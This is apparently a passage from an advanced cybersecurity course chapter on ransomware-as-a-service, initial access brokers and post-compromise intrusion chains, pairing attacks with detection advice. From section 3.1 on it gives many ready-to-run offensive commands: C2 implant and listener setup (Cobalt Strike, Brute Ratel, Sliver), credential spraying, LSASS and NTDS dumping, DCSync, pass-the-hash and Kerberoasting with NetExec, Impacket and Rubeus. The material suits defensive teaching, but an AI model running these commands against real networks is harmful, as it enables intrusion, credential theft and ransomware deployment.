---
corso: "Cybersecurity Masterclass"
fase: "Domain 29 — Ransomware Operations and Enterprise Attack Chains"
modulo: "29.1"
titolo: "RaaS Ecosystem, Initial Access Brokers, Deployment Kill Chains, and Extortion Models"
versione: "LockBit 3.0, BlackCat/ALPHV, Cl0p, Black Basta, Akira, Rhysida, Royal/BlackSuit, Play"
livello: "Advanced"
prerequisiti:
  - "Active Directory attack paths (Domain 14)"
  - "Network protocol fundamentals (TCP/IP, DNS, HTTP/S)"
  - "Windows internals: processes, services, registry, event logging"
  - "Cryptographic primitives: symmetric/asymmetric encryption, key exchange"
  - "C2 framework concepts (Domain 30 Chapter 30A)"
obiettivi:
  - "Map the RaaS economy end-to-end: operators, affiliates, IABs, infostealer supply chain, and monetization infrastructure"
  - "Identify and detect initial access vectors exploited by ransomware affiliates, including appliance CVEs, stolen credentials, and callback phishing"
  - "Trace a complete post-compromise kill chain from foothold through domain dominance to encryption deployment using real tooling (Cobalt Strike, Impacket, Rubeus, BloodHound)"
  - "Analyze encryption internals across major ransomware families and assess feasibility of decryption without payment"
  - "Design layered detection and architectural defenses mapped to each kill chain phase with specific telemetry requirements"
tag: [security, ransomware, raas, lockbit, alphv, blackcat, clop, initial-access-broker, double-extortion, kill-chain, detection-engineering]
---

# Domain 29 — Ransomware Operations and Enterprise Attack Chains

## Chapter 29A — RaaS Ecosystem, Initial Access Brokers, Deployment Kill Chains, and Extortion Models

> **Learning Objectives**
>
> After completing this chapter, the reader will be able to:
> 1. Deconstruct the RaaS value chain from infostealer distribution through IAB marketplaces to affiliate deployment and operator monetization.
> 2. Classify initial access vectors (appliance exploitation, credential replay, phishing variants) and specify detection telemetry for each.
> 3. Execute and detect post-compromise operations including AD enumeration, credential harvesting, lateral movement, and privilege escalation using Impacket, Rubeus, SharpHound, and Mimikatz.
> 4. Reverse-engineer ransomware encryption schemes (AES-CTR, ChaCha20, RSA key wrapping, intermittent encryption) and evaluate decryptor feasibility.
> 5. Map detection surfaces to every kill chain phase and design architectural controls that break the chain before encryption deployment.

> **Scope:** Ransomware-as-a-Service (RaaS) business models and affiliate structures · Initial Access Broker (IAB) marketplaces and pricing models · Credential harvesting for initial access (VPN/RDP/Citrix exploitation) · Post-compromise tooling chains from access to domain dominance · Data staging, exfiltration infrastructure, and double/triple extortion mechanics · Encryption internals across major ransomware families (LockBit 3.0, BlackCat/ALPHV, Cl0p, Royal/BlackSuit, Akira, Play, Black Basta, Rhysida) · Victim negotiation portals and cryptocurrency payment infrastructure · Detection surfaces at every kill chain phase · Architectural defenses that break the chain

---

## 1. The Ransomware Economy: Structure and Roles

Modern ransomware is not a single threat actor writing a payload and deploying it. It is a vertically disaggregated criminal economy with specialized roles, contractual relationships, and market dynamics that mirror legitimate software-as-a-service businesses. Understanding this economy is prerequisite to defending against it, because each role creates a distinct attack surface, a distinct set of indicators, and a distinct set of defensive leverage points.

### 1.1 The RaaS Operator

The RaaS operator develops and maintains the ransomware payload, the builder infrastructure that allows affiliates to generate customized binaries, the backend panel for victim management, the negotiation portal (typically a Tor hidden service), and the data leak site (DLS). The operator takes a percentage of each ransom payment—historically 20–30% for mature programs like LockBit, though newer entrants may offer 10–15% to attract affiliates. The operator never touches the victim network directly. Their product is the encryptor, the decryptor, the infrastructure, and the brand.

LockBit's operator ("LockBitSupp") maintained a sophisticated affiliate panel that tracked encryption statistics, payment status, and victim negotiation timelines. The panel provided affiliates with a builder that accepted configuration parameters: encryption algorithm selection (AES-256-CTR or ChaCha20), file extension targets, ransom note template, exclusion lists for CIS-region systems (a common Russian-nexus ransomware convention), and self-deletion behavior. When law enforcement seized LockBit infrastructure in Operation Cronos (February 2024), the panel database revealed over 7,000 attack builds generated between June 2022 and February 2024, with 2,110 confirmed victims in the negotiation system.

BlackCat/ALPHV innovated by writing their encryptor in Rust, gaining cross-platform capability (Windows, Linux, VMware ESXi) from a single codebase. Their affiliate panel offered a "campaigns" feature that tracked multiple simultaneous victims per affiliate. The March 2024 exit scam—where the operators seized $22 million in Bitcoin from the Change Healthcare ransom payment that an affiliate had deposited—illustrates the trust dynamics in this ecosystem.

### 1.2 The Affiliate

Affiliates are the operators' customers. They purchase or earn access to the RaaS platform, conduct the intrusion, achieve domain dominance, exfiltrate data, and deploy the encryptor. The affiliate is the threat actor your SOC encounters. Affiliates range from sophisticated operators who maintain their own tooling (custom loaders, bespoke C2 infrastructure, proprietary credential-harvesting tools) to low-skill actors who purchase turnkey access from IABs and follow playbooks distributed by the RaaS operator.

A critical implication for defenders: the same RaaS family (e.g., LockBit) may exhibit radically different TTPs across incidents because different affiliates use different tooling. One LockBit affiliate may use Cobalt Strike with Malleable C2 profiles mimicking Amazon CloudFront traffic; another may use Sliver or Brute Ratel; a third may rely entirely on living-off-the-land binaries (LOLBins) like PsExec, WMIC, and PowerShell. Attribution to a RaaS family based on encryptor behavior is straightforward; attribution to a specific affiliate requires analyzing the pre-encryption intrusion chain.

### 1.3 The Initial Access Broker (IAB)

IABs are specialists who compromise organizations and sell the resulting access on criminal forums (Exploit, XSS, RAMP, BreachForums successors) or through private Telegram channels. The IAB does not deploy ransomware; they monetize the initial foothold. Access types sold include:

**VPN credentials** — Typically harvested via infostealer malware (Raccoon, Vidar, RedLine, Lumma, StealC) from employee workstations. The IAB may not have compromised the target organization directly; they purchased a batch of stealer logs from a log marketplace (Russian Market, Genesis Market before its 2023 takedown, or 2easy) and identified corporate VPN credentials within the batch. Pricing: $50–$500 for a single valid VPN credential to a mid-market company, $1,000–$10,000+ for credentials to large enterprises or critical infrastructure.

**RDP access** — Direct RDP exposure to the internet, secured only by password authentication, remains depressingly common. IABs scan for port 3389 (and non-standard RDP ports identified via Shodan/Censys), brute-force or credential-stuff using stealer log data, and sell confirmed sessions. The listing typically specifies the target's estimated revenue (used to price the access and signal ransomware payment capacity), the access level (local admin vs. domain user), and the OS version. Pricing: $500–$5,000 for administrative RDP to companies with $10M–$100M revenue.

**Citrix/NetScaler access** — Exploitation of vulnerabilities like CVE-2023-4966 (Citrix Bleed) and CVE-2023-3519 provided IABs with massive inventory in late 2023. Citrix Bleed allowed session token theft without authentication, yielding authenticated sessions that bypassed MFA entirely. IABs who moved quickly after the advisory could compromise hundreds of organizations and sell each access individually.

**Web shell access** — A web shell planted on an internet-facing application server (typically via SQL injection, file upload vulnerability, or CMS exploit). Lower-value access because it requires more work by the affiliate to pivot internally.

**Domain admin credentials** — The premium product. If the IAB has already achieved domain dominance (via Kerberoasting, ADCS abuse, or credential dumping), they sell the domain admin hash or cleartext credential. Pricing: $5,000–$50,000+ depending on the organization's size.

The IAB marketplace creates a temporal gap that is critical for detection: there is typically a 1–14 day window between the IAB's initial compromise and the affiliate's purchase and subsequent activity. During this window, the organization has been compromised but no ransomware-specific activity has begun. If your detection capability identifies the IAB's initial access activity (infostealer infection on an endpoint, anomalous VPN login, web shell deployment), you can remediate before the affiliate ever arrives.

### 1.4 Supporting Roles

**Infostealer operators** distribute malware (via malvertising, SEO poisoning, cracked software, phishing) that harvests browser-stored credentials, cookies, cryptocurrency wallets, and VPN/RDP client configurations from victim machines. The harvested data is packaged into "logs" and sold on automated marketplaces. A single stealer log may contain the credentials to dozens of services, including corporate VPN, email, banking, and SaaS applications. The infostealer ecosystem is the upstream supply chain for IABs and, increasingly, for ransomware affiliates who cut out the IAB middleman by purchasing stealer logs directly.

**Bulletproof hosting providers** supply infrastructure that ignores abuse complaints. C2 servers, data exfiltration staging servers, and Tor hidden service hosting for negotiation portals all require hosting that will not be taken down by law enforcement requests. Providers operate from jurisdictions with weak international cooperation (historically Russia, parts of Southeast Asia, and certain Caribbean nations).

**Money laundering networks** convert cryptocurrency ransom payments into fiat currency. This involves mixing services (Tornado Cash before OFAC sanctions, Sinbad, ChipMixer before its 2023 seizure), chain-hopping (converting Bitcoin to Monero to obscure transaction graphs), and nested exchanges with weak KYC in jurisdictions with lax regulatory enforcement.

---

## 2. Initial Access Vectors: How They Get In

Ransomware affiliates use a finite set of initial access methods. Each method produces specific telemetry, and each can be addressed architecturally. This section covers the primary vectors observed in 2023–2025 ransomware incidents.

### 2.1 Exploiting Internet-Facing Appliances

The dominant initial access vector for sophisticated ransomware operations since 2023 has been the exploitation of vulnerabilities in internet-facing network appliances: VPN concentrators, firewalls, and remote access gateways. These devices are attractive because they sit at the network perimeter, they often run with elevated privileges, and their exploitation frequently bypasses MFA entirely (because the vulnerability allows pre-authentication access or session hijacking).

**CVE-2023-4966 (Citrix Bleed)** — A buffer over-read in Citrix NetScaler ADC and Gateway that leaked session tokens from process memory. An unauthenticated attacker sent a crafted HTTP request with an oversized `Host` header, causing the appliance to return adjacent memory contents that included valid session cookies. With the stolen session cookie, the attacker replayed an authenticated session without needing credentials or MFA. LockBit affiliates (among others) used Citrix Bleed extensively in Q4 2023, including in the compromise of Boeing's parts distribution network and numerous healthcare organizations.

Detection: Monitor Citrix ADC access logs for sessions that appear without a corresponding authentication event. Specifically, look for NetScaler AAA session cookies being used from IP addresses that never completed the authentication flow. On the network side, inspect HTTP responses from the ADC for anomalously large response bodies to requests with oversized headers.

**CVE-2024-1709 (ConnectWise ScreenConnect)** — An authentication bypass in the remote management tool that allowed an attacker to create an administrative account on the ScreenConnect server by accessing the setup wizard endpoint, which remained accessible even after initial configuration. Trivially exploitable (CVSS 10.0). Multiple ransomware groups including Black Basta and ALPHV used this within days of disclosure.

Detection: Monitor for ScreenConnect server access to `/SetupWizard.aspx` or related endpoints after initial deployment. Alert on new administrative account creation in ScreenConnect. Network-level detection should flag external access to ScreenConnect management ports.

**CVE-2023-46805 and CVE-2024-21887 (Ivanti Connect Secure)** — An authentication bypass chained with a command injection to achieve unauthenticated remote code execution on Ivanti VPN appliances. The authentication bypass exploited a path traversal in the web component to reach an unauthenticated API endpoint, which was then leveraged to inject commands via a template injection vulnerability. UNC5221 (a China-nexus actor) exploited this at scale, but ransomware affiliates adopted the exploit chain rapidly.

Detection: Ivanti appliances log to `/var/log/messages` and `/var/log/uemauth/`. Monitor for web requests to `/api/v1/totp/user-backup-code/../../system/maintenance/archiving/cloud-server-test-connection` (the path traversal chain). The Ivanti Integrity Checker Tool (ICT) can detect filesystem modifications indicating compromise.

**CVE-2024-3400 (Palo Alto PAN-OS GlobalProtect)** — A command injection vulnerability in the GlobalProtect gateway feature. An unauthenticated attacker could inject commands via a crafted cookie value, achieving root-level code execution on the firewall. Particularly dangerous because Palo Alto firewalls are often the most trusted device in the network, and root access on the firewall provides visibility into all network traffic plus the ability to modify firewall rules to facilitate lateral movement.

Detection: Monitor PAN-OS management logs for unexpected process execution (especially shells spawned from the GlobalProtect process). Network detection should flag outbound connections from the firewall management plane to unexpected external hosts.

**Architectural defense:** Internet-facing appliances should be treated as high-value targets. Patch SLAs for these devices should be measured in hours, not days. Deploy appliance-specific integrity monitoring. Segment management interfaces onto dedicated management VLANs inaccessible from the general network. Where possible, place additional authentication layers (e.g., a cloud-based ZTNA broker) in front of the appliance rather than exposing it directly to the internet.

### 2.2 Stolen Credentials and Infostealer Logs

When an affiliate purchases or harvests VPN credentials from infostealer logs, the resulting VPN session is indistinguishable from legitimate user activity at the network level—it uses valid credentials, often from a residential IP (if the attacker routes through a proxy), and the session is authenticated and encrypted just like any other VPN connection.

Detection requires behavioral analysis: login from an IP address never previously associated with that user, login at an unusual time, login from a geolocation inconsistent with the user's known location, or login from an IP address flagged in threat intelligence feeds as a VPN exit node or proxy. Conditional access policies (Azure AD/Entra ID) and identity threat detection tools (Microsoft Defender for Identity, CrowdStrike Falcon Identity Protection, Okta ThreatInsight) can flag these anomalies.

The most effective architectural defense is phishing-resistant MFA (FIDO2/WebAuthn hardware tokens). Infostealer-harvested TOTP seeds or SMS codes can be replayed, but FIDO2 tokens are bound to the legitimate service's origin and cannot be phished or stolen from a stealer log. Deploying FIDO2 across the workforce eliminates the credential-replay attack path entirely.

### 2.3 Phishing and Malware Delivery

Traditional phishing remains a viable initial access vector, particularly against organizations that have not deployed modern email security (sandbox-based attachment detonation, URL rewriting and click-time analysis). The delivery chain has evolved significantly since the era of simple malicious Office macros:

**Callback phishing (BazarCall pattern):** The email contains no malicious link or attachment. Instead, it presents a fake invoice or subscription notification and asks the recipient to call a phone number to cancel. The call center operator (operated by the threat actor) guides the victim through downloading a "cancellation form" that is actually a malware loader. This bypasses all automated email security because the email itself is clean. Royal/BlackSuit and other groups used this technique extensively.

**HTML smuggling:** The email contains an HTML attachment that, when opened in a browser, assembles a malicious payload from JavaScript-encoded fragments and triggers a download. The payload is constructed client-side, so email gateway sandboxes that analyze the HTML file statically see only obfuscated JavaScript, not a recognizable malicious binary. Qakbot and IcedID campaigns used HTML smuggling as a primary delivery mechanism before their respective takedowns.

**SEO poisoning and malvertising:** Rather than delivering malware via email, the attacker promotes malicious websites through search engine optimization or paid advertisements. Victims searching for legitimate software downloads (Slack, Zoom, TeamViewer, various PDF tools) are directed to convincing clone sites that serve trojanized installers. The installer contains the legitimate application plus a malware loader. This approach has been used extensively by the BATLOADER, Nitrogen, and FakeBat campaigns to deliver initial access payloads that are subsequently sold to ransomware affiliates.

Detection for callback phishing requires user awareness training and monitoring for anomalous software downloads following phone calls. HTML smuggling detection requires email gateway rules that flag HTML attachments containing obfuscated JavaScript and client-side file construction patterns (Blob URLs, `msSaveBlob`, `window.URL.createObjectURL`). SEO poisoning detection requires DNS monitoring for domains mimicking legitimate software vendors, endpoint detection for unsigned binaries masquerading as known applications, and browser isolation for uncategorized websites.

---

## 3. Post-Compromise Operations: From Foothold to Domain Dominance

Once inside the network, the affiliate follows a well-established operational sequence. The time from initial access to ransomware deployment has compressed dramatically—from an average of 40+ days in 2019 to as little as 24 hours for some affiliates in 2024–2025. Some LockBit and Akira incidents showed initial-access-to-encryption times under 4 hours. This compression means defenders have a shrinking window for detection and response.

### 3.1 Establishing Persistence and C2

The first post-access action is establishing reliable persistence and command-and-control. Affiliates deploy a range of tools depending on their sophistication:

**Commodity loaders** — SystemBC (a SOCKS5 proxy/backdoor written in C), DarkGate (a multi-function loader with keylogging, credential stealing, and remote access capabilities), and Pikabot (a successor to Qakbot that provides initial foothold and module loading). These tools phone home to the affiliate's C2 infrastructure, typically over HTTPS to blend with legitimate traffic. SystemBC is particularly common because it provides a SOCKS proxy that the affiliate uses to tunnel other tools (Cobalt Strike, RDP sessions) through the compromised host without exposing additional C2 channels to the network.

**Professional C2 frameworks** — Cobalt Strike remains the dominant post-exploitation framework in ransomware intrusions, despite its commercial licensing model (cracked copies circulate widely). Beacon's sleep timers, malleable C2 profiles, and extensive post-exploitation module library make it highly flexible. Sliver (open source, written in Go) and Brute Ratel C4 (commercial, designed specifically for EDR evasion) are increasingly observed as affiliates diversify away from Cobalt Strike due to improved detection signatures. For detailed analysis of these frameworks' internal architectures, see Domain 30 Chapter 30A.

**Remote monitoring and management (RMM) tools** — Affiliates increasingly install legitimate RMM tools (AnyDesk, Atera, Splashtop, Level.io, ConnectWise ScreenConnect) as persistence mechanisms. Because these are legitimate signed applications, they bypass application whitelisting, are not flagged as malicious by EDR, and blend with IT administration traffic. The affiliate installs the RMM agent with their own account credentials, giving them persistent interactive access that survives C2 takedowns.

Detection: Monitor for unauthorized RMM tool installations. Maintain an inventory of approved RMM solutions and alert on the installation of any RMM agent not in the approved list. AnyDesk installations create a service named `AnyDesk` and write to `%ProgramData%\AnyDesk\`. Splashtop creates `SplashtopStreamer` service. These are high-fidelity detections because the set of approved RMM tools in an enterprise environment is small and well-defined.

**Persistence mechanisms** — Beyond C2, affiliates establish persistence via scheduled tasks (`schtasks /create`), Windows services, registry run keys (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`), WMI event subscriptions, or DLL search-order hijacking in commonly running applications. ESXi environments see persistence via modified `/etc/rc.local.d/local.sh` startup scripts or cron jobs.

#### 3.1.1 Cobalt Strike Operator Workflow

The most common C2 framework in ransomware intrusions is Cobalt Strike. A typical affiliate workflow begins with listener creation, beacon generation, and delivery. The teamserver is started with a Malleable C2 profile that shapes traffic to mimic legitimate HTTPS services, making network-level detection significantly harder.

```bash
# Start teamserver with a Malleable C2 profile mimicking Amazon CloudFront
./teamserver 10.10.10.5 MyP@ssw0rd! ./profiles/amazon.profile

# Inside the Cobalt Strike console, create an HTTPS listener
# Listeners > Add > Beacon HTTPS
# Host: cdn-static.example.com (attacker-controlled domain fronting through CloudFront)
# Port: 443
# Profile: amazon.profile (loaded at teamserver startup)
```

Beacon generation produces the implant that affiliates deliver via phishing, web shells, or dropped by a first-stage loader like SystemBC or DarkGate. The stageless beacon is preferred in modern operations because staged beacons expose the shellcode stager to network inspection. From the Cobalt Strike console:

```
# Generate a stageless HTTPS beacon (Attacks > Packages > Windows Executable (S))
# Output: artifact_x64.exe (default) or DLL/shellcode based on selection
# Configure: sleep 60 with 37% jitter to randomize callback intervals

beacon> sleep 60 37
beacon> checkin
```

Post-exploitation commands executed through Beacon drive the entire intrusion chain. Affiliates use `spawn` to inject into another process, `jump` for lateral movement, `hashdump` for local credential extraction, and `dcsync` to replicate domain credentials. The operator's console tracks each beacon session, allowing simultaneous management of hundreds of compromised hosts.

Artifacts: Cobalt Strike Beacon in memory exhibits characteristic named pipe patterns (default `\\.\pipe\msagent_##` but customizable), and its HTTP traffic follows the Malleable C2 profile structure. The default JA3 hash for Cobalt Strike's HTTPS client (`72a589da586844d7f0818ce684948eea`) has been widely fingerprinted, though operators customize this via the profile's `set ssl_client {}` block. Sysmon Event ID 1 captures the initial execution, Event ID 3 captures the C2 callback, and Event ID 17/18 capture named pipe creation and connection.

#### 3.1.2 Brute Ratel C4 Operator Commands

Brute Ratel C4 (BRc4), marketed as an adversary simulation framework, has been adopted by ransomware affiliates because its "badger" implant was designed from the ground up for EDR evasion. Unlike Cobalt Strike, BRc4 avoids common detection surfaces like `ntdll.dll` usermode hooks by using direct and indirect syscalls.

```
# Generate a badger (implant) from the BRc4 GUI or CLI
# Operator > Create Badger > HTTPS > Target: x64 > Output: EXE/DLL/Shellcode
# Set callback host: updates.legit-domain.com:443
# Set sleep: 30s with 40% jitter

# Inside an active badger session:
badger> sharphound_exe -c All -d target.local --zipfilename bloodhound.zip
badger> dcsync target.local\krbtgt
badger> jump psexec DC01.target.local C:\Windows\Temp\payload.exe
```

BRc4 also supports pivot listeners, where a compromised internal host acts as a relay for badgers deeper in the network, avoiding direct outbound C2 from internal servers that lack internet access. The `pivot_listener` command opens a listening port on the compromised host, and newly deployed badgers on internal systems call back to this internal relay.

Artifacts: BRc4 badgers create a named mutex with a pattern derived from the configuration. The DNS resolution pattern for BRc4 C2 domains differs from Cobalt Strike's in that it uses DOH (DNS over HTTPS) by default when configured. Memory forensics can identify the BRc4 reflective loader by searching for the string `BRC4` or the configuration decryption routine's AES key schedule pattern.

#### 3.1.3 Sliver C2 Implant Generation

Sliver is an open-source C2 framework written in Go. Its growing adoption by ransomware affiliates stems from its ease of deployment, its lack of licensing restrictions (unlike cracked Cobalt Strike), and its use of mutual TLS (mTLS), WireGuard, or HTTP(S) for C2 transport.

```bash
# Generate a Sliver implant from the server console
sliver > generate --mtls 10.10.10.5 --os windows --arch amd64 --format exe --save /tmp/implant.exe

# Generate a shellcode implant for injection
sliver > generate --mtls 10.10.10.5 --os windows --arch amd64 --format shellcode --save /tmp/implant.bin

# Start an mTLS listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Start an HTTPS listener with domain fronting
sliver > https --lhost 0.0.0.0 --lport 443 --domain cdn-updates.example.com

# Inside an active session, execute post-exploitation
sliver (IMPLANT_NAME) > execute-assembly /path/to/SharpHound.exe -c All
sliver (IMPLANT_NAME) > seatbelt -- -group=all
sliver (IMPLANT_NAME) > pivots tcp --bind 0.0.0.0:9999
```

Artifacts: Sliver implants compiled as Go binaries contain distinctive Go build metadata in the binary headers. The mTLS handshake uses Sliver's self-signed CA, producing a unique certificate chain detectable via TLS inspection. Network connections from Sliver implants to the C2 server exhibit a characteristic JA3 hash that differs from standard Go HTTP clients because of Sliver's custom TLS configuration.

#### 3.1.4 CrackMapExec/NetExec for Network Reconnaissance

CrackMapExec (CME), now continued as NetExec (nxc), is the Swiss Army knife of Active Directory reconnaissance and credential validation in ransomware intrusions. Affiliates use it to spray credentials across the network, enumerate shares, execute commands, and validate administrative access on multiple hosts simultaneously.

```bash
# Enumerate SMB hosts and identify domain information
nxc smb 192.168.1.0/24 --gen-relay-list targets.txt

# Credential spraying with a known password against all discovered hosts
nxc smb 192.168.1.0/24 -u users.txt -p 'Summer2025!' --continue-on-success

# Validate domain admin credentials and enumerate shares
nxc smb 192.168.1.0/24 -u 'admin' -p 'P@ssw0rd!' -d target.local --shares

# Pass-the-hash authentication
nxc smb 192.168.1.0/24 -u 'admin' -H 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c'

# Execute commands on all hosts where credentials are valid (using WMI)
nxc smb 192.168.1.0/24 -u 'admin' -p 'P@ssw0rd!' -d target.local --exec-method wmiexec -x 'whoami /all'

# Dump SAM database from targets
nxc smb 192.168.1.0/24 -u 'admin' -p 'P@ssw0rd!' -d target.local --sam

# Enumerate and dump LSASS via nanodump method
nxc smb 192.168.1.0/24 -u 'admin' -p 'P@ssw0rd!' -d target.local -M nanodump
```

Artifacts: CME/NetExec generates a burst of SMB authentication attempts visible in Event ID 4624 (Type 3) and 4625 on target hosts. The sequential nature of the scanning (one host after another in rapid succession from a single source) creates a distinctive pattern in authentication logs. The tool's default SMB client string and NTLMSSP negotiation flags can be fingerprinted at the network level.

### 3.2 Reconnaissance and Credential Harvesting

After establishing persistence, the affiliate maps the network and harvests credentials for lateral movement.

**Active Directory enumeration** — Tools like BloodHound, SharpHound (its .NET collector), ADExplorer (Sysinternals), and `ldapsearch` queries map the AD structure, identify domain administrators, locate high-value targets (domain controllers, file servers, backup servers), and find privilege escalation paths (misconfigured delegation, ADCS templates, group membership chains). The LDAP queries generated by SharpHound are detectable: monitor for single-source LDAP queries enumerating all user objects, group memberships, GPO links, trust relationships, and SPNs in rapid succession. See Domain 14 Chapter 14A for detailed AD attack paths.

**Network scanning** — SoftPerfect Network Scanner, Advanced IP Scanner, and `nmap` are commonly observed. Some affiliates use PowerShell-based port scanning to avoid dropping binaries. The scanning targets are predictable: SMB (445), RDP (3389), WinRM (5985/5986), SSH (22), and database ports. Internal network scanning from a workstation is anomalous and should trigger alerts.

**Credential dumping** — The affiliate needs domain-level credentials to deploy ransomware across the environment. Primary techniques observed in ransomware incidents:

Mimikatz or its variants (pypykatz for Python-based environments) dump credentials from LSASS memory. Modern EDR detects direct `MiniDumpWriteDump` calls against the LSASS process, so affiliates use indirect methods: creating a memory dump via `comsvcs.dll` (`rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\temp\lsass.dmp full`), using the legitimate SysInternals tool `procdump.exe -ma lsass.exe`, or using the `MalSecLogon` technique that leverages `CreateProcessWithLogonW` to duplicate the LSASS handle. Domain 30 Chapter 30B provides byte-level detail on LSASS memory parsing.

Kerberoasting extracts service account TGS tickets from AD (any authenticated domain user can request them) and cracks them offline. Service accounts with weak passwords are compromised within seconds. Targeted Kerberoasting using pre-enumerated SPNs from BloodHound output is the standard approach. Detection: monitor for a single account requesting TGS tickets for an unusually large number of SPNs in a short timeframe (Event ID 4769 in Windows Security logs). See Domain 13 Chapter 13B for Kerberos protocol mechanics.

DCSync, using Mimikatz's `lsadump::dcsync` command, impersonates a domain controller and requests password replication data via the MS-DRSR protocol (`GetNCChanges` RPC). This yields the NTLM hash of any account, including `krbtgt` (enabling Golden Ticket attacks). Detection: Event ID 4662 logging for DS-Replication-Get-Changes and DS-Replication-Get-Changes-All extended rights requested by a non-domain-controller computer object.

NTDS.DIT extraction—copying the Active Directory database file from a domain controller via Volume Shadow Copy (`vssadmin create shadow /for=C:` followed by copying `\Windows\NTDS\ntds.dit` and the SYSTEM registry hive for the boot key) and cracking it offline with `secretsdump.py` from Impacket. Detection: monitor for `vssadmin` or `wmic shadowcopy` execution on domain controllers, and for large file transfers from DCs to workstations.

#### 3.2.1 Impacket for Credential-Based Access and Extraction

Impacket is the de facto standard Python toolkit for interacting with Windows network protocols. Ransomware affiliates (and the pentesting community whose tools affiliates adopt) use Impacket's suite of scripts for remote command execution, credential dumping, and lateral movement. Each script implements a different remote execution mechanism, and each leaves distinct artifacts.

`impacket-psexec` creates a Windows service on the remote host to execute commands. It uploads a service binary to the `ADMIN$` share, registers it with the Service Control Manager (SCM), and starts it. This produces Event ID 7045 (new service installed) on the target.

```bash
# Remote shell via PsExec (creates a service, noisiest option)
impacket-psexec 'target.local/admin:P@ssw0rd!@192.168.1.10'

# Pass-the-hash variant
impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c' 'target.local/admin@192.168.1.10'

# Execute a specific command instead of interactive shell
impacket-psexec 'target.local/admin:P@ssw0rd!@192.168.1.10' 'cmd.exe /c whoami'
```

`impacket-wmiexec` uses Windows Management Instrumentation (WMI) via DCOM for command execution. It does not create a service, making it less noisy than `psexec`, but it does create processes via `wmiprvse.exe` (the WMI Provider Host), visible in Sysmon Event ID 1 with parent process `C:\Windows\System32\wbem\wmiprvse.exe`.

```bash
# WMI-based remote execution
impacket-wmiexec 'target.local/admin:P@ssw0rd!@192.168.1.10'

# With Kerberos authentication (using a cached TGT from a .ccache file)
export KRB5CCNAME=/tmp/admin.ccache
impacket-wmiexec -k -no-pass 'DC01.target.local'
```

`impacket-smbexec` is similar to `psexec` but avoids writing a binary to disk. Instead, it creates a service whose binary path is a command string that writes output to a file share, then reads the output back. This leaves a more distinctive service creation pattern (the service binary path is a `cmd.exe /Q /c` command string rather than a path to an executable).

```bash
# SMB-based execution (service creation with cmd.exe binary path)
impacket-smbexec 'target.local/admin:P@ssw0rd!@192.168.1.10'
```

`impacket-atexec` uses the Windows Task Scheduler (AT protocol and newer ATSVC RPC) to create a scheduled task that executes the command. This produces Event ID 4698 (scheduled task created) on the target.

```bash
# Scheduled task-based execution
impacket-atexec 'target.local/admin:P@ssw0rd!@192.168.1.10' 'whoami'
```

For credential extraction, `impacket-secretsdump` is the primary tool for remote and offline extraction of credentials from domain controllers.

```bash
# Remote DCSync attack — extracts all domain hashes via MS-DRSR replication
impacket-secretsdump 'target.local/admin:P@ssw0rd!@DC01.target.local' -just-dc

# Extract only the NTLM hashes (skip Kerberos keys)
impacket-secretsdump 'target.local/admin:P@ssw0rd!@DC01.target.local' -just-dc-ntlm

# Extract specific user's credentials
impacket-secretsdump 'target.local/admin:P@ssw0rd!@DC01.target.local' -just-dc-user krbtgt

# Offline extraction from copied NTDS.DIT and SYSTEM hive
impacket-secretsdump -ntds /path/to/ntds.dit -system /path/to/SYSTEM LOCAL

# Extract credentials via SAM + SECURITY + SYSTEM hive (local accounts)
impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
```

Prerequisites: All Impacket remote execution tools require valid credentials (password, NTLM hash, or Kerberos ticket) with administrative privileges on the target host. The target must have the relevant service accessible: SMB (TCP 445) for `psexec`/`smbexec`, WMI (TCP 135 + dynamic RPC ports) for `wmiexec`, and Task Scheduler RPC for `atexec`. DCSync via `secretsdump` requires Replicating Directory Changes and Replicating Directory Changes All privileges in AD — typically held by Domain Admins and Domain Controllers.

#### 3.2.2 Rubeus for Kerberos Attacks

Rubeus is a C# tool for Kerberos interaction and abuse. It is the standard tool for Kerberoasting, AS-REP Roasting, ticket manipulation, and delegation attacks in ransomware intrusions. Affiliates typically execute it in memory via Cobalt Strike's `execute-assembly` or through a .NET loader to avoid writing the binary to disk.

```powershell
# Kerberoasting — request TGS tickets for all SPNs and output in hashcat-compatible format
Rubeus.exe kerberoast /outfile:hashes.txt /format:hashcat

# Targeted Kerberoasting — request TGS for a specific SPN (quieter, harder to detect)
Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql_hash.txt /format:hashcat

# AS-REP Roasting — enumerate accounts without pre-auth and extract their AS-REP hashes
Rubeus.exe asreproast /outfile:asrep_hashes.txt /format:hashcat

# Request a TGT using a plaintext password (for pass-the-ticket)
Rubeus.exe asktgt /user:admin /password:P@ssw0rd! /domain:target.local /ptt

# Request a TGT using an NTLM hash (overpass-the-hash)
Rubeus.exe asktgt /user:admin /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:target.local /ptt

# S4U delegation abuse — request a service ticket on behalf of another user
Rubeus.exe s4u /user:machine$ /rc4:<hash> /impersonateuser:admin /msdsspn:cifs/fileserver.target.local /ptt

# Monitor for and extract TGTs from logon sessions (requires elevation)
Rubeus.exe monitor /interval:5 /filteruser:admin

# Dump all Kerberos tickets from memory
Rubeus.exe dump
```

Detection: Kerberoasting generates Event ID 4769 (TGS request) where the encryption type is `0x17` (RC4-HMAC) rather than AES. A single account requesting TGS tickets for many distinct SPNs in rapid succession is the primary detection signal. AS-REP Roasting generates Event ID 4768 (TGT request) with result code `0x0` for accounts that have "Do not require Kerberos preauthentication" enabled. Monitoring for these events at the domain controller level is essential.

#### 3.2.3 SharpHound/BloodHound Collection and Analysis

SharpHound is the .NET data collector for BloodHound, the graph-based Active Directory analysis tool. Affiliates run SharpHound to map every attack path from their current access level to Domain Admin. The collector queries LDAP, enumerates local group memberships via SAM-R, checks session data, and maps ACLs.

```powershell
# Full collection — all data types (noisiest, generates significant LDAP traffic)
SharpHound.exe -c All -d target.local --zipfilename bloodhound_data.zip

# Stealth collection — only LDAP-based data, no session enumeration
SharpHound.exe -c DCOnly -d target.local --zipfilename bloodhound_dc.zip

# Targeted collection with specific domain controller
SharpHound.exe -c All -d target.local --domaincontroller DC01.target.local --zipfilename bh.zip

# Loop collection — re-collect session data every 5 minutes to catch admin logons
